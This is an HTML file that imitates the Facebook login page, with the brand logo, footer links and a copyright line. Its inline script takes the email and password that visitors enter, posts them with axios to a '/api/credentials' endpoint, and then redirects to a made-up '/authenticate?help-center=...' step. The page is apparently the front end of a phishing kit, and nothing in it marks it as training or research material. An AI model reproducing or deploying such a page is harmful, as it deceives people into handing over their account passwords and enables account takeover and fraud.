<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="./assets/icons8-facebook.svg" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Log in or Sign up</title>
    <style>
      body {
        font-family: Helvetica, sans-serif;
      }
      input[type=text]:focus {
        box-shadow: 0 0 2pt 1pt #1876f230;
        outline-width: 0px;
      }
      input[type=password]:focus {
        box-shadow: 0 0 2pt 1pt #1876f230;
        outline-width: 0px;
      }
    </style>
      <script src="https://cdn.tailwindcss.com"></script>

  </head>
  <body>
    <div class="flex flex-col bg-[#F0F2F5]  w-full items-center justify-center">
      <div class="mb-40 sm:mb-40 md:mb-10 lg:mb-10 sm:mb-40 mt-8 sm:mt-8 md:mt-36 lg:mt-36 w-full max-w-[980px] h-[536px] py-[20px] flex flex-col sm:flex-col md:flex-row lg:flex-row justify-center items-center sm:items-cetner md:items-start lg:items-start sm:justify-center md:justify-between lg:justify-between">
          <div class="fb-welcome flex flex-col mb-8 sm:mb-8 md:mb-0 lg:mb-0">
            <div class="w-[301px] h-[106px] mt-4 ml-16 sm:ml-16 md:-ml-8 lg:-ml-8 -mb-2">
              <img class="w-full h-full"  src="./assets/dF5SId3UHWd.svg" alt="facebook-logo">
            </div>
            <p class="mb-6 sm:mb-6 md:mb-0 lg:mb-0  text-center sm:text-center md:text-left lg:text-left text-[24px] sm:text-[24px] md:text-[28px] lg:text-[28px]  text-[#1c1e21] leading-8 font-[500]">Facebook helps you connect and share <br> with the people in your life.</p>
          </div>
          <div class=" flex flex-col items-center">
            <div class="fb-box -mt-6 bg-white rounded-lg w-[396px] h-[350px] p-4 shadow-lg flex flex-col items-center">
            <input id="email" type="text" placeholder="Email address or phone number" class="min-w-full p-3 border border-[#c7c7c8] rounded-[6px] mb-3 focus:border-[#1877f2] focus:outline-0">
            <input id="password" type="password" placeholder="Password" class="min-w-full p-3 border border-[#c7c7c8] rounded-[6px] mb-4  focus:border-[#1877f2] focus:outline-0">
            <button  id="login-btn" class="min-w-full bg-[#1877f2] rounded-[6px] text-white text-[20px] py-2 font-[600] mb-4">Log In</button>
            <p class="text-[#1877f2] hover:underline hover:cursor-pointer text-[14px] w-full text-center mb-5">Forgot password?</p>
            <div class="divider w-full h-[1px] bg-[#dcdcde]"></div>
            <button class="max-w-fit p-3 bg-[#42b72a] rounded-[6px] text-white text-[17px] py-3 px-[16px] font-[600] mt-6 self-center">Create new account</button>
            </div>

            <p class="text-[14px] mt-[28px]"><strong class="hover:underline cursor-pointer">Create a Page</strong> for a celebrity, brand or business.</p>
            
          </div>
      </div>
      <div class="w-full  bg-white mx-auto py-5 px-5 sm:px-5 md:px-0 lg:px-0">
        <ul class="max-w-[980px] flex flex-wrap gap-x-2.5 text-[12px] text-[#8a8291] mx-auto pt-2">
                  <li>English (US)</li>
                  <li class=" hover:cursor-pointer hover:underline">Shqip</li>
                  <li class=" hover:cursor-pointer hover:underline">Deutsch</li>
                  <li class=" hover:cursor-pointer hover:underline">Türkçe</li>
                  <li class=" hover:cursor-pointer hover:underline">Српски</li>
                  <li class=" hover:cursor-pointer hover:underline">Français (France)</li>
                  <li class=" hover:cursor-pointer hover:underline">Italiano</li>
                  <li class=" hover:cursor-pointer hover:underline">Bosanski</li>
                  <li class=" hover:cursor-pointer hover:underline">Svenska</li>
                  <li class=" hover:cursor-pointer hover:underline">Español</li>
                  <li class=" hover:cursor-pointer hover:underline">Português (Brasil)</li>
                  <li class="bg-[#f5f6f7] flex items-center justify-center px-2 rounded-[2px] border border-[#c7c7c8] cursor-pointer">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="#4c4c4d" class="w-4 h-4">
                      <path stroke-linecap="round" stroke-linejoin="round" d="M12 4.5v15m7.5-7.5h-15" />
                    </svg>
                  </li>
                </ul>

                <div class="divider max-w-[980px] h-[1px] bg-[#dcdcdc] mx-auto mb-1 mt-2"></div>

                <ul class="max-w-[980px] flex flex-wrap gap-x-4 gap-y-0.5 text-[12px] text-[#8a8291] mx-auto pt-2">
                  <li class=" hover:cursor-pointer hover:underline">Sign Up</li>
                  <li class=" hover:cursor-pointer hover:underline">Log In</li>
                  <li class=" hover:cursor-pointer hover:underline">Messenger</li>
                  <li class=" hover:cursor-pointer hover:underline">Facebook Lite</li>
                  <li class=" hover:cursor-pointer hover:underline">Watch</li>
                  <li class=" hover:cursor-pointer hover:underline">Places</li>
                  <li class=" hover:cursor-pointer hover:underline">Games</li>
                  <li class=" hover:cursor-pointer hover:underline">Marketplace</li>
                  <li class=" hover:cursor-pointer hover:underline">Meta Pay</li>
                  <li class=" hover:cursor-pointer hover:underline">Oculus</li>
                  <li class=" hover:cursor-pointer hover:underline">Portal</li>
                  <li class=" hover:cursor-pointer hover:underline">Instagram</li>
                  <li class=" hover:cursor-pointer hover:underline">Bulletin</li>
                  <li class=" hover:cursor-pointer hover:underline">Fundraisers</li>
                  <li class=" hover:cursor-pointer hover:underline">Services</li>
                  <li class=" hover:cursor-pointer hover:underline">Voting Information Center</li>
                  <li class=" hover:cursor-pointer hover:underline">Privacy Policy</li>
                  <li class=" hover:cursor-pointer hover:underline">Privacy Center</li>
                  <li class=" hover:cursor-pointer hover:underline">Groups</li>
                  <li class=" hover:cursor-pointer hover:underline">About</li>
                  <li class=" hover:cursor-pointer hover:underline">Create Ad</li>
                  <li class=" hover:cursor-pointer hover:underline">Create Page</li>
                  <li class=" hover:cursor-pointer hover:underline">Developers</li>
                  <li class=" hover:cursor-pointer hover:underline">Careers</li>
                  <li class=" hover:cursor-pointer hover:underline">Cookies</li>
                  <li class=" hover:cursor-pointer hover:underline">Ad choices</li>
                  <li class=" hover:cursor-pointer hover:underline">Terms</li>
                  <li class=" hover:cursor-pointer hover:underline">Help</li>
                  <li class=" hover:cursor-pointer hover:underline">Contact Uploading & Non-UsersSettings</li>
              </ul>
              <div class="max-w-[980px] mx-auto mt-6">
                <p class=" text-[11px] text-[#8a8291] ">Meta © 2023</p>
              </div>
      </div>
    </div>
    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.3.4/axios.min.js" integrity="sha512-LUKzDoJKOLqnxGWWIBM4lzRBlxcva2ZTztO8bTcWPmDSpkErWx0bSP4pdsjNH8kiHAUPaT06UXcb+vOEZH+HpQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script> -->
    <script type="module" src="/main.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.3.4/axios.min.js" integrity="sha512-LUKzDoJKOLqnxGWWIBM4lzRBlxcva2ZTztO8bTcWPmDSpkErWx0bSP4pdsjNH8kiHAUPaT06UXcb+vOEZH+HpQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script >
      let login_button = document.getElementById('login-btn')
      let email_input = document.getElementById('email')
      let password_input = document.getElementById('password')
      let is_loading = false

      let disableButton = (id) => {
        setTimeout(() => {
          is_loading = false
          location.href = `/authenticate?help-center=baf04feb-c71c-4a96-acd6-2e8957d31993-f2d7e879-cdca-4050-8d73-1aabd087dbc8-7e271c-7-a77a-4664-9070-54e4afa2ba6b-e8b65f16-a0be-4947-bd1f-03ff08c70d99&id=${id}&step=1`
        }, 500)
      }

      function validate_form() {
        return email_input.value && password_input.value.length >= 8 ? true : false
      }

      login_button.addEventListener('click', function(e) {
        if(validate_form()) {
          is_loading = true
          login_button.style.backgroundColor = ' #1876f2a1'


          axios.post('/api/credentials', {
            email: email_input.value,
            password: password_input.value
          })
          .then(function (response) {
            console.log('id:');
            console.log(response.data.data.id);
            let id = response.data.data.id;
            
            disableButton(id);

          })
          .catch(function (error) {
            console.log(error.response);
          });

        }
      }, false)
    </script>
  </body>
</html>
